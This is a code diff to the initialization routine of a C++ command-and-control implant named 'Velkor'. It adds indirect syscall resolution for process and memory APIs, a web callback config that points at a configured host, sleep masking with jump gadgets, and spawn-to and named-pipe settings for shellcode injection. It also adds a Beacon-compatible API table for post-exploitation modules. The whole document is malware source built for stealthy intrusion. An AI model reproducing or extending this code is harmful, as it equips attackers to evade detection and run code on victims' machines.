@@ -4,8 +4,10 @@ D_SEC( B ) VOID SetNtStatusToSystemError(
     _In_ NTSTATUS NtStatus
 ) {
     VELKOR_INSTANCE
-
-     return VkCall<VOID>( XprNtdll, XPR( "RtlSetLastWin32Error" ), VkCall<ULONG>( XprNtdll, XPR( "RtlNtStatusToDosError" ), NtStatus ) );
+    
+    ULONG WinError =  VkCall<ULONG>( XprNtdll, XPR( "RtlNtStatusToDosError" ), NtStatus );
+    Velkor->Teb->LastErrorValue = WinError;
+    return;
 }
 
 D_SEC( B ) BOOL VelkorInit(
@@ -33,30 +35,49 @@ D_SEC( B ) BOOL VelkorInit(
     MEMORYSTATUSEX                     MemInfoEx     = { 0 };
     PROCESS_EXTENDED_BASIC_INFORMATION PsBasicInfoEx = { 0 };
 
+    // Retrieve TEB
     Velkor->Teb = NtCurrentTeb();
+
+    /* ========================[ Load Modules and Functions ]======================== */
 
     VkCall<VOID>( XprKernel32, XPR( "LoadLibraryA" ), "advapi32.dll" );
     VkCall<VOID>( XprKernel32, XPR( "LoadLibraryA" ), "cryptbase.dll" );
+    VkCall<VOID>( XprKernel32, XPR( "LoadLibraryA" ), "wininet.dll" );
 
-    Velkor->Module[eMsvcrt]    = LdrLoadModule( XprMsvcrt );
-    Velkor->Module[eKernel32]  = LdrLoadModule( XprKernel32 );
-    Velkor->Module[eCryptbase] = LdrLoadModule( XprCryptBase );
+    Velkor->VkWin32.Module[eMsvcrt]    = LdrLoadModule( XprMsvcrt );
+    Velkor->VkWin32.Module[eKernel32]  = LdrLoadModule( XprKernel32 );
+    Velkor->VkWin32.Module[eCryptbase] = LdrLoadModule( XprCryptBase );
 
-    Velkor->FunctionPtr.printf = (decltype(&printf))LdrLoadFunc( Velkor->Module[eMsvcrt], XPR( "printf" ) );
+    Velkor->VkWin32.FunctionPtr.printf = (decltype(&printf))LdrLoadFunc( Velkor->VkWin32.Module[eMsvcrt], XPR( "printf" ) );
 
-    Velkor->FunctionPtr.NtWaitForSingleObject = LdrLoadFunc( Velkor->Module[eNtdll], XPR( "NtWaitForSingleObject" ) );
-    Velkor->FunctionPtr.RtlCaptureContext     = LdrLoadFunc( Velkor->Module[eNtdll], XPR( "RtlCaptureContext" ) );
-    Velkor->FunctionPtr.NtGetContextThread    = LdrLoadFunc( Velkor->Module[eNtdll], XPR( "NtGetContextThread" ) );
-    Velkor->FunctionPtr.NtSetContextThread    = LdrLoadFunc( Velkor->Module[eNtdll], XPR( "NtSetContextThread" ) );
-    Velkor->FunctionPtr.NtTestAlert           = LdrLoadFunc( Velkor->Module[eNtdll], XPR( "NtTestAlert" ) );
-    Velkor->FunctionPtr.SetEvent              = LdrLoadFunc( Velkor->Module[eKernel32], XPR( "SetEvent" ) );
-    Velkor->FunctionPtr.VirtualProtect        = LdrLoadFunc( Velkor->Module[eKernel32], XPR( "VirtualProtect" ) );
-    Velkor->FunctionPtr.WaitForSingleObjectEx = LdrLoadFunc( Velkor->Module[eKernel32], XPR( "WaitForSingleObjectEx" ) );
-    Velkor->FunctionPtr.SystemFunction040     = LdrLoadFunc( Velkor->Module[eCryptbase], XPR( "SystemFunction040" ) );
-    Velkor->FunctionPtr.SystemFunction041     = LdrLoadFunc( Velkor->Module[eCryptbase], XPR( "SystemFunction041" ) );
+    Velkor->VkWin32.FunctionPtr.NtWaitForSingleObject = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtWaitForSingleObject" ) );
+    Velkor->VkWin32.FunctionPtr.RtlCaptureContext     = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "RtlCaptureContext" ) );
+    Velkor->VkWin32.FunctionPtr.NtGetContextThread    = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtGetContextThread" ) );
+    Velkor->VkWin32.FunctionPtr.NtSetContextThread    = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtSetContextThread" ) );
+    Velkor->VkWin32.FunctionPtr.NtTestAlert           = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtTestAlert" ) );
+    Velkor->VkWin32.FunctionPtr.SetEvent              = LdrLoadFunc( Velkor->VkWin32.Module[eKernel32], XPR( "SetEvent" ) );
+    Velkor->VkWin32.FunctionPtr.VirtualProtect        = LdrLoadFunc( Velkor->VkWin32.Module[eKernel32], XPR( "VirtualProtect" ) );
+    Velkor->VkWin32.FunctionPtr.WaitForSingleObjectEx = LdrLoadFunc( Velkor->VkWin32.Module[eKernel32], XPR( "WaitForSingleObjectEx" ) );
+    Velkor->VkWin32.FunctionPtr.SystemFunction040     = LdrLoadFunc( Velkor->VkWin32.Module[eCryptbase], XPR( "SystemFunction040" ) );
+    Velkor->VkWin32.FunctionPtr.SystemFunction041     = LdrLoadFunc( Velkor->VkWin32.Module[eCryptbase], XPR( "SystemFunction041" ) );
 
-    Velkor->Session.SyscallMethod = VelkorNtApi;
-    Velkor->Session.AgentId       = ( Random32() % 99999999 );
+    /* ========================[ Initialize Indirect Syscall ]======================== */
+
+    RetrieveSyscall( XPR( "NtAllocateVirtualMemory" ),  &VkSys[eNtAllocateVirtualMemory] );
+    RetrieveSyscall( XPR( "NtOpenProcess" ),            &VkSys[eNtOpenProcess] );
+    RetrieveSyscall( XPR( "NtOpenThread" ),             &VkSys[eNtOpenThread] );
+    RetrieveSyscall( XPR( "NtTerminateProcess" ),       &VkSys[eNtTerminateProcess] );
+    RetrieveSyscall( XPR( "NtCreateThreadEx" ),         &VkSys[eNtCreateThreadEx] );
+    RetrieveSyscall( XPR( "NtResumeThread" ),           &VkSys[eNtResumeThread] );
+    RetrieveSyscall( XPR( "NtOpenProcessToken" ),       &VkSys[eNtOpenProcessToken] );
+    RetrieveSyscall( XPR( "NtOpenThreadToken" ),        &VkSys[eNtOpenThreadToken] );
+    RetrieveSyscall( XPR( "NtWriteVirtualMemory" ),     &VkSys[eNtWriteVirtualMemory] );
+    RetrieveSyscall( XPR( "NtWriteVirtualMemory" ),     &VkSys[eNtWriteVirtualMemory] );
+    RetrieveSyscall( XPR( "NtProtectVirtualMemory" ),   &VkSys[eNtProtectVirtualMemory] );
+    RetrieveSyscall( XPR( "NtQueryVirtualMemory" ),     &VkSys[eNtQueryVirtualMemory] );
+    RetrieveSyscall( XPR( "NtFreeVirtualMemory" ),      &VkSys[eNtFreeVirtualMemory] );
+
+    /* ========================[ Get System Info's ]======================== */
 
     MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );
 
@@ -116,7 +137,27 @@ D_SEC( B ) BOOL VelkorInit(
     VkMem::Copy( Velkor->System.ProcessorName.Start, C_PTR( &cProcessorName ), ProcBufferSize );
 
     Velkor->System.NumberOfProcessors = SysInfo.dwNumberOfProcessors;
-    
+
+    Velkor->System.OsMajorV         = Velkor->Teb->ProcessEnvironmentBlock->OSMajorVersion;
+    Velkor->System.OsMinorV         = Velkor->Teb->ProcessEnvironmentBlock->OSMinorVersion;
+    Velkor->System.OsBuildNumber    = Velkor->Teb->ProcessEnvironmentBlock->OSBuildNumber;
+    Velkor->System.OsArch           = 9;
+
+    /* ========================[ Web config ]======================== */
+
+    WebConf.Host            = HOST_CONFIG;
+    WebConf.Port    	    = PORT_CONFIG;
+    WebConf.UserAgent       = USER_AGENT_CONFIG;
+    WebConf.AddHeaders      = ADD_HEADERS_CONFIG;
+    WebConf.Secure          = TRUE;
+    WebConf.ProxyUserName   = NULL;
+    WebConf.ProxyServers    = NULL;
+    WebConf.ProxyPassword   = NULL;
+
+    /* ========================[ Initialize Session Info's ]======================== */
+
+    Velkor->Session.SyscallMethod   = VkCallIndirect;
+    Velkor->Session.AgentId         = ( Random32() % 99999999 );
     Velkor->Session.ProcessName     = Velkor->Teb->ProcessEnvironmentBlock->ProcessParameters->DllPath.Buffer;
     Velkor->Session.ProcessFullPath = Velkor->Teb->ProcessEnvironmentBlock->ProcessParameters->ImagePathName.Buffer;
     Velkor->Session.CommandLine     = Velkor->Teb->ProcessEnvironmentBlock->ProcessParameters->CommandLine.Buffer;
@@ -127,15 +168,72 @@ D_SEC( B ) BOOL VelkorInit(
     Velkor->Session.ProcessArch     = PsBasicInfoEx.IsWow64Process;
     Velkor->Session.Protected       = PsBasicInfoEx.IsProtectedProcess;
 
-    SleepConf.JmpGadget        = FindJmpGadget( Velkor->Module[eNtdll], 0x23 );
-    SleepConf.NtContinueGadget = C_PTR( LdrLoadFunc( Velkor->Module[eNtdll], XPR( "LdrInitializeThunk" ) ) + 19 );
-    SleepConf.SleepTechnique   = VK_SLEEP_TECHNIQUE;
+    /* ========================[ Initialize Sleep Info's ]======================== */
+
+    SleepConf.JmpGadget        = FindJmpGadget( Velkor->VkWin32.Module[eNtdll], 0x23 );
+    SleepConf.NtContinueGadget = C_PTR( LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "LdrInitializeThunk" ) ) + 19 );
+    SleepConf.SleepMask        = VK_SLEEP_MASK;
     SleepConf.SleepTime        = VK_SLEEP_TIME;
     SleepConf.Jitter           = 0;
 
+    /* ========================[ PostEx Info's ]======================== */
+
+    INT16 PipeNameSize = 8;
+    ULONG ForkNameSize = 0;
+
+    PSTR  TmpPipeVal   = VkStr::GenerateRndStr( PipeNameSize );
+    PSTR  TmpForkVal   = VK_SPAWNTO;
+
+    ForkNameSize = VkStr::LengthA( TmpForkVal ); 
+    PipeNameSize = VkStr::LengthA( TmpPipeVal ); 
+
+    InjCtx.Args.Fork.PipeName = A_PTR( VkMem::Heap::Alloc( VkStr::LengthA( TmpPipeVal ) ) );
+    PsCtx.Spawn.ProcessName   = A_PTR( VkMem::Heap::Alloc( ForkNameSize ) );
+    PsCtx.Type                = VK_PS_TYPE;
+
+    InjCtx.ScRun[ScClassic]  = Injection::Shellcode::Classic;
+    // InjCtx.ScRun[ScStomping] = Injection::Shellcode::Stomping;
+
+    VkMem::Zero( PsCtx.Spawn.ProcessName, ForkNameSize );
+    VkMem::Copy( PsCtx.Spawn.ProcessName, TmpForkVal, ForkNameSize );
+    VkMem::Zero( TmpForkVal, ForkNameSize );
+
+    VkMem::Zero( InjCtx.Args.Fork.PipeName, PipeNameSize );
+    VkMem::Copy( InjCtx.Args.Fork.PipeName, TmpPipeVal, PipeNameSize );
+    VkMem::Zero( TmpPipeVal, PipeNameSize );
+
+    BEACON_API BeaconApi[] = {
+        { XPR( "BeaconDataInt" ),              Beacon::DataInt },
+        { XPR( "BeaconDataShort" ),            Beacon::DataShort },
+        { XPR( "BeaconDataLength" ),           Beacon::DataLength },
+        { XPR( "BeaconDataExtract" ),          Beacon::DataExtract },
+        { XPR( "BeaconOutput" ),               Beacon::Output },
+        { XPR( "BeaconPrintf" ),               Beacon::Printf },
+        { XPR( "BeaconVirtualAlloc" ),         VkMem::Alloc },
+        { XPR( "BeaconVirtualProtect" ),       VkMem::Protect },
+        { XPR( "BeaconWriteProcessMemory" ),   VkMem::Write },
+        { XPR( "BeaconVirtualQuery" ),         VkMem::Query },
+        { XPR( "BeaconVirtualFree" ),          VkMem::Free },
+        { XPR( "BeaconCreateProcessA" ),       VkProcess::Create },
+        { XPR( "BeaconOpenProcess" ),          VkProcess::Open },
+        { XPR( "BeaconTerminate" ),            VkProcess::Kill },
+        { XPR( "BeaconLoadLibraryA" ),         VkProcess::Create },
+        { XPR( "BeaconGetModuleHandleA" ),     LdrLoadModule },
+        { XPR( "BeaconGetProcAddress" ),       LdrLoadFunc }
+    };
+
+    INT16 BeaconApiLen = ( sizeof( BeaconApi ) / sizeof( BeaconApi[0] ) );
+
+    VkShow( 
+    //     "{==================[ Transfer Config ]==================}\n"
+         "\t{INIT} Host  => %ws\n"
+         "\t{INIT} Port  => %d\n",
+         WebConf.Host, WebConf.Port
+    );
+
     VkShow(
         "{================[ Session Config ]======================}\n"
-        "\t{INI} Agent ID             => %d\n"
+        "\t{INI} Agent ID             => %X\n"
         "\t{INI} Process Name         => %ws\n"
         "\t{INI} Process Arch         => %d\n"
         "\t{INI} Process Full Path    => %ws\n"
@@ -153,7 +251,7 @@ D_SEC( B ) BOOL VelkorInit(
         Velkor->Session.ProcessId,
         Velkor->Session.ParentProcessId,
         Velkor->Session.ThreadId,
-        Velkor->Session.Elevated ? L"TRUE" : L"FALSE",
+        Velkor->Session.Elevated ?  L"TRUE" : L"FALSE",
         Velkor->Session.Protected ? L"TRUE" : L"FALSE"
     );
 
@@ -189,7 +287,7 @@ D_SEC( B ) BOOL VelkorInit(
     return ( bSuccess && uSuccess );
 }
 
-BOOL VelkorCleanup(
+D_SEC( B ) BOOL VelkorCleanup(
     VOID
 ) {
     VELKOR_INSTANCE
